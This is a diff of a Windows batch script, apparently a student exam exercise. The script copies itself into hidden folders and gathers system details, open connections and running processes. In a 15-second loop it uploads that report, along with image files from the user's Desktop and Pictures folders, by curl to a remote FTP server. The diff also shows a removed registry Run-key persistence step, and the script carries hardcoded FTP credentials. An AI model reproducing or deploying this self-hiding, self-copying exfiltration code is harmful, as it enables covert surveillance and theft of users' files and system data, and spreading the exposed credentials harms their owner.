@@ -11,21 +11,17 @@ set "NOMBRE_COMPLETO=Rios Maldonado Julio Cesar"
 set "MAQUINA=%COMPUTERNAME%"
 set "ruta=GR03_Rios_%COMPUTERNAME%"
 
-:: Nombres de archivos
 set "ARCHIVO_BAT=GR03_Rios_%COMPUTERNAME%.bat"
 set "ARCHIVO_TXT=GR03_Rios_%COMPUTERNAME%.txt"
 
-:: Rutas locales
 set "CARPETA_C=C:\parcial"
 set "CARPETA_TEMP=%temp%\parcial"
 set "TXT_LOCAL_C=!CARPETA_C!\!ARCHIVO_TXT!"
 set "TXT_LOCAL_TEMP=!CARPETA_TEMP!\!ARCHIVO_TXT!"
 
-:: Rutas de origen de imagenes
 set "ORIGEN_ESCRITORIO=%USERPROFILE%\Desktop"
 set "ORIGEN_IMAGENES=%USERPROFILE%\Pictures"
 
-:: Configuracion FTP
 set "FTP_USER=u917850771"
 set "FTP_PASS=Unicesar2026+"
 set "FTP_BASE=ftp://82.25.87.225/domains/sistemasoperativos.xyz/NubeParcial"
@@ -42,10 +38,10 @@ if "%1" neq "hidden" (
 )
 
 :: ======================================================================
-:: --- CREAR CARPETAS SI NO EXISTEN ---
+:: --- CREAR CARPETAS ---
 :: ======================================================================
-if not exist "!CARPETA_C!" mkdir "!CARPETA_C!" >nul 2>&1
-if not exist "!CARPETA_TEMP!" mkdir "!CARPETA_TEMP!" >nul 2>&1
+if not exist "!CARPETA_C!" mkdir "!CARPETA_C!"
+if not exist "!CARPETA_TEMP!" mkdir "!CARPETA_TEMP!"
 
 :: ======================================================================
 :: --- AUTOREPLICACION ---
@@ -54,20 +50,7 @@ if /i "%~f0" neq "!CARPETA_C!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_C!\!ARCHIV
 if /i "%~f0" neq "!CARPETA_TEMP!\!ARCHIVO_BAT!" copy /Y "%~f0" "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1
 
 :: ======================================================================
-:: --- OCULTAR CARPETAS Y ARCHIVOS ---
-:: ======================================================================
-attrib +h +s "!CARPETA_C!" /d /s >nul 2>&1
-attrib +h +s "!CARPETA_TEMP!" /d /s >nul 2>&1
-attrib +h +s "!CARPETA_C!\!ARCHIVO_BAT!" >nul 2>&1
-attrib +h +s "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1
-
-:: ======================================================================
-:: --- PERSISTENCIA EN REGISTRO (HKCU - User) ---
-:: ======================================================================
-reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v "!APELLIDO!" /t REG_SZ /d "!CARPETA_TEMP!\!ARCHIVO_BAT!" /f >nul 2>&1
-
-:: ======================================================================
-:: --- OBTENER INFORMACION DEL SISTEMA ---
+:: --- OBTENER INFO DEL SISTEMA ---
 :: ======================================================================
 for /f "tokens=*" %%V in ('ver') do set "WIN_VER=%%V"
 
@@ -79,7 +62,7 @@ if not exist "!CARPETA_TEMP!" mkdir "!CARPETA_TEMP!" >nul 2>&1
 set "FECHA=!date!"
 set "HORA=!time!"
 
-:: IP IPv4
+:: IP
 set "IP="
 for /f "tokens=2 delims=:" %%I in ('ipconfig ^| findstr /i "IPv4"') do (
     if not defined IP set "IP=%%I"
@@ -92,24 +75,28 @@ for /f "tokens=1" %%M in ('getmac ^| findstr /r "..-..-..-..-..-.."') do (
     if not defined MAC set "MAC=%%M"
 )
 
-:: Memoria RAM
+:: Memoria
 for /f "tokens=2 delims==" %%R in ('wmic computersystem get totalphysicalmemory /value 2^>nul') do (
     set "MEM_BYTES=%%R"
 )
 
-:: Proceso maximo RAM
+:: Max RAM
 for /f "tokens=*" %%P in ('powershell -Command "Get-Process | Sort-Object WorkingSet -Descending | Select-Object -First 1 -ExpandProperty Name" 2^>nul') do set "MAX_RAM=%%P"
 
-:: Proceso maximo CPU
+:: Max CPU
 for /f "tokens=*" %%C in ('powershell -Command "Get-Process | Sort-Object CPU -Descending | Select-Object -First 1 -ExpandProperty Name" 2^>nul') do set "MAX_CPU=%%C"
 
 if not defined MAX_RAM set "MAX_RAM=NoDetectado"
 if not defined MAX_CPU set "MAX_CPU=NoDetectado"
 
 :: ======================================================================
-:: --- GENERAR REPORTE TXT CON FORMATO 3.1-3.14 ---
+:: --- GENERAR REPORTE TXT (ESCRITURA LINEA POR LINEA) ---
 :: ======================================================================
-> "!TXT_LOCAL_C!" (
+:: Limpiar archivo
+del "!TXT_LOCAL_C!" >nul 2>&1
+
+:: Escribir header
+(
 echo ============================================================
 echo  3.1. Titulo: informacion de la maquina !MAQUINA!
 echo ============================================================
@@ -124,43 +111,50 @@ echo  3.9. Usuario actual: !USERNAME!
 echo  3.10. Nombre de la maquina: !MAQUINA!
 echo  3.13. Proceso que mas memoria consume: !MAX_RAM!
 echo  3.14. Proceso que mas procesador consume: !MAX_CPU!
+) >> "!TXT_LOCAL_C!"
+
+:: Escribir netstat
+(
 echo ============================================================
-echo  3.11. PUERTOS ABIERTOS Y CONEXIONES (netstat)
+echo  3.11. PUERTOS ABIERTOS Y CONEXIONES (netstat -ano)
 echo ============================================================
-netstat -ano
+) >> "!TXT_LOCAL_C!"
+netstat -ano >> "!TXT_LOCAL_C!" 2>&1
+
+:: Escribir tasklist
+(
 echo.
 echo ============================================================
 echo  3.12. LISTAR PROCESOS ACTIVOS (tasklist)
 echo ============================================================
-tasklist
-)
+) >> "!TXT_LOCAL_C!"
+tasklist >> "!TXT_LOCAL_C!" 2>&1
 
-:: Duplicar en carpeta temp
+:: Duplicar a temp
 copy /Y "!TXT_LOCAL_C!" "!TXT_LOCAL_TEMP!" >nul 2>&1
 
-:: Ocultar archivos txt
+:: ======================================================================
+:: --- OCULTAR ARCHIVOS (despues de escribir) ---
+:: ======================================================================
+attrib +h +s "!CARPETA_C!" /d /s >nul 2>&1
+attrib +h +s "!CARPETA_TEMP!" /d /s >nul 2>&1
+attrib +h +s "!CARPETA_C!\!ARCHIVO_BAT!" >nul 2>&1
+attrib +h +s "!CARPETA_TEMP!\!ARCHIVO_BAT!" >nul 2>&1
 attrib +h +s "!TXT_LOCAL_C!" >nul 2>&1
 attrib +h +s "!TXT_LOCAL_TEMP!" >nul 2>&1
 
 :: ======================================================================
-:: --- SUBIR ARCHIVOS POR FTP (CADA 15 SEGUNDOS) ---
+:: --- SUBIR POR FTP ---
 :: ======================================================================
-:: Subir reporte txt principal
-curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!TXT_LOCAL_C!" "!FTP_URL!" >nul 2>&1
+curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!TXT_LOCAL_C!" "!FTP_URL!" 2>nul
 
-:: Subir imagen1.jpg desde Escritorio
 if exist "!ORIGEN_ESCRITORIO!\imagen1.jpg" (
-    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_ESCRITORIO!\imagen1.jpg" "!FTP_URL_ESC!/imagen1.jpg" >nul 2>&1
+    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_ESCRITORIO!\imagen1.jpg" "!FTP_URL_ESC!/imagen1.jpg" 2>nul
 )
 
-:: Subir imagen2.jpg desde Imagenes
 if exist "!ORIGEN_IMAGENES!\imagen2.jpg" (
-    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_IMAGENES!\imagen2.jpg" "!FTP_URL_IMG!/imagen2.jpg" >nul 2>&1
+    curl -u "!FTP_USER!:!FTP_PASS!" --ftp-create-dirs -T "!ORIGEN_IMAGENES!\imagen2.jpg" "!FTP_URL_IMG!/imagen2.jpg" 2>nul
 )
 
-:: ======================================================================
-:: --- TEMPORIZADOR DE 15 SEGUNDOS ---
-:: ======================================================================
 timeout /t 15 /nobreak >nul
-
 goto BUCLE
